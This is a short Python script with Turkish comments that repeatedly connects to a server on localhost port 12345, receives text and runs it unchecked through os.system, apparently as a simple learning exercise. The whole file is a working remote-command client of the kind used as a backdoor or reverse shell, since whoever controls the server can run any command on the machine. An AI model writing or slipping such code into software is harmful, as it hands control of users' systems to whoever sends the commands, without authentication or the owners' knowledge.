import socket
import time
import os

for i in range(99999):
    # Socket oluşturulması
    s = socket.socket()          
    
    # Bağlanılacak adres ve port
    host = "localhost"
    port = 12345                
    
    
    try:
        # Bağlantıyı yap
        s.connect((host, port)) 
        
        # serverden yanıtı al
        yanit = s.recv(1024)
        os.system(yanit.decode("utf-8"))
        
        # bağlantıyı kapat
        s.close() 
    except socket.error as msg:
        print("[Server aktif değil.] Mesaj:", msg)
        time.sleep(5)
        quit()
